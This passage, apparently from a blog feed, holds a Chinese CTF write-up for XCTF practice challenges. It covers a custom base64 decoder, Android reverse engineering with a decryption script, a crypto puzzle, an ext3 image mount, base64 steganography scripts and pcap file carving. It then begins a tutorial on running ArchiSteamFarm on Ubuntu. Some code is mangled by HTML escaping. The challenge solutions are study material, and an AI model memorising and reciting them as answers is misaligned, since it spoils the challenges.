class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#print(bin_str)</span></span><br><span class="line"><span class="comment"># 输出的字符串</span></span><br><span class="line">outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">nums = inputs.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> bin_str:</span><br><span class="line">temp_list = bin_str[:<span class="number">4</span>]</span><br><span class="line">temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line"><span class="comment">#print(temp_str)</span></span><br><span class="line"><span class="comment"># 补足8位字节</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(temp_str) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">temp_str = temp_str[<span class="number">0</span>:-<span class="number">1</span> * nums * <span class="number">2</span>]</span><br><span class="line"><span class="comment"># 将四个6字节的二进制转换为三个字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">int</span>(<span class="built_in">len</span>(temp_str) / <span class="number">8</span>)):</span><br><span class="line">outputs += <span class="built_in">chr</span>(<span class="built_in">int</span>(temp_str[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">bin_str = bin_str[<span class="number">4</span>:]</span><br><span class="line">print(<span class="string">&quot;Decrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;     *    (1)encode         (2)decode    *&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;Please select the operation you want to perform:\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(num == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be encrypted: \n&quot;</span>)</span><br><span class="line">My_base64_encode(input_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be decrypted: \n&quot;</span>)</span><br><span class="line">My_base64_decode(input_str)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     *************************************</span><br><span class="line">     *    (1)encode         (2)decode    *</span><br><span class="line">     *************************************</span><br><span class="line"></span><br><span class="line">Please select the operation you want to perform:</span><br><span class="line">2</span><br><span class="line">Please enter a string that needs to be decrypted:</span><br><span class="line">QAoOQMPFks1BsB7cbM3TQsXg30i9g3==</span><br><span class="line">Decrypted String:</span><br><span class="line">flag&#123;实践出真知这不是flag&#125;</span><br></pre></td></tr></table></figure><h3 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考点：手撕算法</strong></p><blockquote><p>部分函数名已重命名，懒得再找一份原题QAQ</p></blockquote><p>开门见山，mainactivity 就能找到加密算法入口。函数将输入值剔除<code>flag&#123;&#125;</code> ，然后传入加密函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Boolean <span class="title">b</span><span class="params">(String string)</span> </span>&#123;  <span class="comment">// 结尾&#125;</span></span><br><span class="line">    Boolean result;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(!string.startsWith(<span class="string">&quot;flag&#123;&quot;</span>)) &#123;  <span class="comment">// 开头flag&#123;</span></span><br><span class="line">        result = Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(!string.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">        result = Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        String string_1 = string.substring(<span class="number">5</span>, string.length() - <span class="number">1</span>);  <span class="comment">// 分割字符串去除flag&#123;&#125;</span></span><br><span class="line">        Mb v4 = <span class="keyword">new</span> Mb(Integer.valueOf(<span class="number">2</span>));</span><br><span class="line">        Ma v5 = <span class="keyword">new</span> Ma(Integer.valueOf(<span class="number">3</span>));</span><br><span class="line">        StringBuilder c_string = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; string_1.length()) &#123;</span><br><span class="line">            c_string.append(MainActivity.a(string_1.charAt(index) + <span class="string">&quot;&quot;</span>, v4, v5));<span class="comment">//加密函数</span></span><br><span class="line">            Integer v6 = Integer.valueOf(v4.b().intValue() / <span class="number">25</span>);</span><br><span class="line">            <span class="keyword">if</span>(v6.intValue() &gt; v1 &amp;&amp; v6.intValue() &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                ++v1;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++index;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = Boolean.valueOf(c_string.toString().equals(<span class="string">&quot;wigwrkaugala&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密函数有两层最后调用为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">a</span><span class="params">(String string, Mb b, Ma a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.a(b.a(string));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a b 加密逻辑大致一样，处理对象都是单字符，进行混淆后，对密钥进行更新。</p><p>b 加密函数主要如下：（忽略处理空格和字符不存在情况）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Mb.key_list = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">a</span><span class="params">(String string)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">    Integer v1 = Integer.valueOf(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(Mb.key_list.contains(string.toLowerCase())) &#123;  <span class="comment">// 转为小写，然后查询在不在key中</span></span><br><span class="line">        Integer index = Integer.valueOf(Mb.key_list.indexOf(string));</span><br><span class="line">        <span class="keyword">while</span>(v0 &lt; Mb.a_ArrayList.size() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(Mb.a_ArrayList.get(v0) == index) &#123;</span><br><span class="line">                v1 = Integer.valueOf(v0);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++v0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">…………</span><br><span class="line">Mb.a();</span><br><span class="line"><span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密操作为：检索字符在<code>keylisit</code>的下标，记为<code>index</code>，然后检索<code>index</code>在<code>a_ArrayList</code>的下标，记为<code>v1</code>，检索成功就调用<code>Mb.a()</code>生成新的密钥<code>keylist</code>和<code>a_ArrayList</code>，然后返回<code>v1</code>。</p><p><code>a_ArrayList</code>不是一个静态变量，是经由<code>public Mb(Integer arg9)</code>生成的，一开始以为动态生成的，然后动态调试了一下，发现是第一次调用时生成好了，后续字符加密沿用上一字符密钥。生成的偏移为 2 。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-28-18PsopqjCVDDdny8.png"></p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-28-cyfmgGJeWshDBKLi.png"></p><p><code>Mb.a()</code>处理逻辑就是：每一轮加密完成后，将两个密钥的首元素放置到最后一位。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v0 = Mb.a_ArrayList.get(<span class="number">0</span>).intValue();</span><br><span class="line">    Mb.a_ArrayList.remove(<span class="number">0</span>);</span><br><span class="line">    Mb.a_ArrayList.add(Integer.valueOf(v0));  <span class="comment">// 将列表首个元素放到最后</span></span><br><span class="line">    Mb.key_list = Mb.key_list + <span class="string">&quot;&quot;</span> + Mb.key_list.charAt(<span class="number">0</span>);</span><br><span class="line">    Mb.key_list = Mb.key_list.substring(<span class="number">1</span>, <span class="number">27</span>);  <span class="comment">// 将列表首个元素放到最后</span></span><br><span class="line">    Mb.d = Integer.valueOf(Mb.d.intValue() + <span class="number">1</span>);  <span class="comment">// 某个计算位加1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>a.a(b.a(string))</code> b 函数加密完成后，返回值作为参数传入 a ，加密方式与 b 相近，较大不同点是每轮加密不会随机化密钥，密钥初始偏移为 3 。因为从最后判断函数可知 flag 中间字符为 12 位，不足以触发 a 随机化密钥函数要求。</p><p>解密EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque <span class="comment"># 双端队列简化随机密钥实现</span></span><br><span class="line">alpha = deque(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>) </span><br><span class="line"><span class="comment">#key_b = deque([8, 25, 17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13]) </span></span><br><span class="line"><span class="comment">#key_a = deque([7, 14, 16, 21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8])</span></span><br><span class="line">key_b = deque([<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">25</span>])</span><br><span class="line">key_a = deque([<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>])</span><br><span class="line">c = <span class="string">&#x27;wigwrkaugala&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span> </span><br><span class="line">    i = key_a[(<span class="built_in">ord</span>(s) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))]</span><br><span class="line">    i = key_b[(i)] </span><br><span class="line">    print(alpha[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    key_b.append(key_b.popleft()) </span><br><span class="line">    alpha.append(alpha.popleft())</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;flag&#123;&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> c: decode(s)</span><br><span class="line">print(<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>提交 flag 后看评论区好像题目有多解。</p></blockquote><p>[/collapse]</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>给出文本：<code>8842101220480224404014224202480122</code>。查看资料后，得出 0 是分解符。分界后各个数字相加后 -1 为与 A 的 ascii 码偏移。（ps：怎么感觉有点像是 8421 码）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解密字符</span></span><br><span class="line">c = <span class="string">&#x27;;8842101220480224404014224202480122&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">c</span>):</span></span><br><span class="line">c = c.split(<span class="string">&#x27;;0&#x27;</span>;)<span class="comment">#分割</span></span><br><span class="line">print(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">a = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">a += <span class="built_in">int</span>(j)</span><br><span class="line">print(<span class="built_in">chr</span>(a+<span class="built_in">ord</span>(<span class="string">&#x27;;A&#x27;</span>;)-<span class="number">1</span>),end=<span class="string">&#x27;;&#x27;</span>;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;;__main__&#x27;</span>;:</span><br><span class="line">decode(c)</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>题目提示是 Linux 系统镜像，首先反应是内存取证，然后使用 volatility 无法挂载。于是另寻方法，发现使用 IDA 32 位能成功打开，然后是查找字符串 shift+f12 ，因为内存镜像中的字符串也是可以被 IDA 读取的。加载字符串后，搜索 flag 发现 flag.txt 文件地址： O7avZhikgKgbF/flag.txt 。</p><p>然后就是怎么提取文件，正常情况下是用 volatility dump 命令，问题是现在加载不了。我采取用将其挂载到 Linux 虚拟机上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#创建挂载文件夹</span><br><span class="line">mkdir ext3</span><br><span class="line">#挂载</span><br><span class="line">mount f1fc23f5c743425d9e0073887c846d23 ext3</span><br><span class="line">#取消挂载</span><br><span class="line"><span class="meta">#umount ext3</span></span><br><span class="line">cat O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure><p>当然也可以不用 IDA 分析，直接挂载后搜索 <code>find / -name flag.txt</code></p><p>[/collapse]</p><h3 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>base64 隐写题目。隐写原理来自<a href="https://www.tr0y.wang/2017/06/14/Base64steg/">tr0y</a>：</p><p>隐写原理<br>注意红色的 0, 我们在解码的时候将其丢弃了, 所以这里的值不会影响解码. 所以我们可以在这进行隐写.<br>为什么等号的那部分 0 不能用于隐写? 因为修改那里的二进制值会导致等号数量变化, 解码的第 1 步会受影响. 自然也就破坏了源字符串.<br>而红色部分的 0 是作为最后一个字符二进制的组成部分, 还原时只用到了最后一个字符二进制的前部分, 后面的部分就不会影响还原.<br>唯一的影响就是最后一个字符会变化. 如下图</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200315111022.png"></p><p>如果你直接解密’VHIweQ==’与’VHIweR==’, 得到的结果都是’Tr0y’.</p><p>当然, 一行 base64 顶多能有 2 个等号, 也就是有 2*2 位的可隐写位. 所以我们得弄很多行, 才能隐藏一个字符串, 这也是为什么题目给了一大段 base64 的原因.<br>接下来, 把要隐藏的 flag 转为 8 位二进制, 塞进去就行了.</p><p>加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag = <span class="string">&#x27;;Tr0y&#123;Base64isF4n&#125;&#x27;</span>; <span class="comment">#flag</span></span><br><span class="line">bin_str = <span class="string">&#x27;;&#x27;</span>;.join([<span class="built_in">bin</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;;0b&#x27;</span>;, <span class="string">&#x27;;&#x27;</span>;).zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag])</span><br><span class="line">base64chars = <span class="string">&#x27;;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;;0.txt&#x27;</span>;, <span class="string">&#x27;;rb&#x27;</span>;) <span class="keyword">as</span> f0, <span class="built_in">open</span>(<span class="string">&#x27;;1.txt&#x27;</span>;, <span class="string">&#x27;;wb&#x27;</span>;) <span class="keyword">as</span> f1: <span class="comment">#&#x27;;0.txt&#x27;;是明文, &#x27;;1.txt&#x27;;用于存放隐写后的 base64</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f0.readlines():</span><br><span class="line">        rowstr = base64.b64encode(line.replace(<span class="string">&#x27;;\n&#x27;</span>;, <span class="string">&#x27;;&#x27;</span>;))</span><br><span class="line">        equalnum = rowstr.count(<span class="string">&#x27;;=&#x27;</span>;)</span><br><span class="line">        <span class="keyword">if</span> equalnum <span class="keyword">and</span> <span class="built_in">len</span>(bin_str):</span><br><span class="line">            offset = <span class="built_in">int</span>(<span class="string">&#x27;;0b&#x27;</span>;+bin_str[:equalnum * <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            char = rowstr[<span class="built_in">len</span>(rowstr) - equalnum - <span class="number">1</span>]</span><br><span class="line">            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])</span><br><span class="line">            bin_str = bin_str[equalnum*<span class="number">2</span>:]</span><br><span class="line">        f1.write(rowstr + <span class="string">&#x27;;\n&#x27;</span>;)</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">&#x27;;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;;1.txt&#x27;</span>;, <span class="string">&#x27;;rb&#x27;</span>;) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">&#x27;;&#x27;</span>;.join(line.split())</span><br><span class="line">        rowb64 =  <span class="string">&#x27;;&#x27;</span>;.join(stegb64.decode(<span class="string">&#x27;;base64&#x27;</span>;).encode(<span class="string">&#x27;;base64&#x27;</span>;).split())</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;;=&#x27;</span>;,<span class="string">&#x27;;&#x27;</span>;)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;;=&#x27;</span>;,<span class="string">&#x27;;&#x27;</span>;)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;;=&#x27;</span>;) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;;&#x27;</span>;.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]) <span class="comment">#8 位一组</span></span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>分组字节流查询字符串 flag.txt 发现有结果</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200315214046.png"></p><p>将流量包用 foremost 分析出压缩包 00002778.zip ，需密码才能解压 flag.txt ，继续查询流量，发现有 6666.jpg </p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200315154335.png"></p><p>右键跟踪 tcp 流量，点击 save as 保存数据，用文本编辑器打开，将 FFD8 jpg 文件头前数据删除，以及最后一个 FFD9 后面数据删除，全选复制。</p><p>用 winhex 或者 010editor 新建一个空白文件，以 ascii-hex 写入数据，并保存为 jpg ，获得解压密码。</p><p>[/collapse]</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> xctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用ASF在Ubuntu下实现Steam云挂卡</title>
      <link href="archives/5478b6dc/"/>
      <url>archives/5478b6dc/</url>
      
        <content type="html"><![CDATA[<h1 id="使用ASF在Ubuntu下实现Steam云挂卡"><a href="#使用ASF在Ubuntu下实现Steam云挂卡" class="headerlink" title="使用ASF在Ubuntu下实现Steam云挂卡"></a>使用ASF在Ubuntu下实现Steam云挂卡</h1><h2 id="我的环境"><a href="#我的环境" class="headerlink" title="我的环境"></a>我的环境</h2><ul><li>Ubuntu 18</li><li>主机配置为 1C1G</li><li>ASF 搭建版本：V4.2.0.1</li><li>ASF-Bot 搭建版本：2019.9.12</li></ul><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><h3 id="下载-ASF"><a href="#下载-ASF" class="headerlink" title="下载 ASF"></a>下载 ASF</h3><p>从 ASF V3 开始 .Net SDK 不是必须要安装，已经集成，所以直接下载安装 ASF （<strong>本文默认在 /root 目录下安装</strong>）。最新版下载链接请到<a href="https://github.com/JustArchiNET/ArchiSteamFarm/releases">这里</a>找。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建文件夹</span></span><br><span class="line">mkdir asf &amp;&amp; cd asf</span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载压缩包</span></span><br><span class="line">wget https://github.com/JustArchiNET/ArchiSteamFarm/releases/download/4.2.0.3/ASF-linux-x64.zip</span><br><span class="line"><span class="meta">#</span><span class="bash"> 解压(没有unzip的：apt install unzip -y)</span></span><br><span class="line">unzip ASF-linux-x64.zip</span><br><span class="line"><span class="meta">#</span><span class="bash"> 权限</span></span><br><span class="line">chmod +x ArchiSteamFarm</span><br></pre></td></tr></table></figure><h3 id="生成-ASF-程序配置文件"><a href="#生成-ASF-程序配置文件" class="headerlink" title="生成 ASF 程序配置文件"></a>生成 ASF 程序配置文件</h3><p>使用<a href="https://justarchinet.github.io/ASF-WebConfigGenerator/">在线网站</a>生成，选择 ASF 选项并根据下面提示选择性填写内容，可根据个人需求自行调整，各个参数介绍看<a href="https://github.com/JustArchiNET/ArchiSteamFarm/wiki/Setting-up-zh-CN">Wiki</a>。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-14-RFHpWQBLNkTr23U5.png"></p><p>SteamOwnerID：64 位 SteamID，到<a href="https://steamrepcn.com/">这里</a>登录后获取。</p><p>CurrentCulture：zh-CN</p><p>IPC：√</p><p>IPCPassword：password（自行设置）</p><p>其他选项使用默认，下载配置文件 ASF.config 到本地，通过 finalshell 等工具上传 ASF.config 到服务器的 /asf/config 目录下。</p><h3 id="生成-steam-帐号配置文件（ASF-Bot-配置文件）"><a href="#生成-steam-帐号配置文件（ASF-Bot-配置文件）" class="headerlink" title="生成 steam 帐号配置文件（ASF Bot 配置文件）"></a>生成 steam 帐号配置文件（ASF Bot 配置文件）</h3><p>使用<a href="https://justarchinet.github.io/ASF-WebConfigGenerator/">在线网站</a>生成，选择 机器人 选项并根据下面提示选择性填写内容，可根据个人需求自行调整，各个参数介绍看<a href="https://github.com/JustArchiNET/ArchiSteamFarm/wiki/Setting-up-zh-CN">Wiki</a>。</p><p>name：test（机器人名=配置文件名）</p><p>SteamLogin ：steam帐号名</p><p>SteamPassword：steam帐号密码</p><p>enable：√</p><p>其他选项使用默认，下载配置文件 test.config 到本地，通过 finalshell 等工具上传 test.config 到服务器的 /asf/config 目录下。</p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p>在 asf 目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ArchiSteamFarm</span><br></pre></td></tr></table></figure><p>按照提示输入验证码即可。如果想访问 WEB 界面还需要一些设置，请看[这里](# 为 Asf-ui 绑定域名)</p><h2 id="进阶设置"><a href="#进阶设置" class="headerlink" title="进阶设置"></a>进阶设置</h2><h3 id="保持后台运行"><a href="#保持后台运行" class="headerlink" title="保持后台运行"></a>保持后台运行</h3><h4 id="Screen"><a href="#Screen" class="headerlink" title="Screen"></a>Screen</h4><p>安装 screen</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install screen -y</span><br></pre></td></tr></table></figure><p>创建一个名为 asf 的窗口，并在其中执行程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 